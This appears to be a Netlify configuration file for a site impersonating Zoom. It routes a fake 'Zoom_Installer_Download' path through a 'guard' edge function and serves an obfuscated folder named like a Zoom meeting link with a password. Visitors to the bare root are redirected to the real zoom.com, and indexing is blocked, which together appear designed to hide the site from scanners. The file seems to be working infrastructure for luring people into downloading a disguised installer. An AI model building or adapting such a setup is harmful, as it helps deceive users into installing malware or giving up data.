[[headers]]
  for = "/*"
  [headers.values]
    X-Frame-Options = "DENY"
    Content-Security-Policy = "frame-ancestors 'none'; default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; media-src 'self' blob:; connect-src 'self'"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "camera=(self), microphone=(self), geolocation=()"
    X-Robots-Tag = "noindex, noarchive, nosnippet, nofollow"
    Cache-Control = "private, max-age=0, must-revalidate"

# 1. Route downloads through your guard
[[redirects]]
  from = "/Zoom_Installer_Download/*"
  to   = "/.netlify/edge-functions/guard"
  status = 200
  force = true

# 2. Redirect the bare root to the external site
[[redirects]]
  from = "/"
  to = "https://www.zoom.com"
  status = 302
  force = true

# 3. Route the exact obfuscated folder to its index.html
[[redirects]]
  from = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3"
  to = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/index.html"
  status = 200
  force = true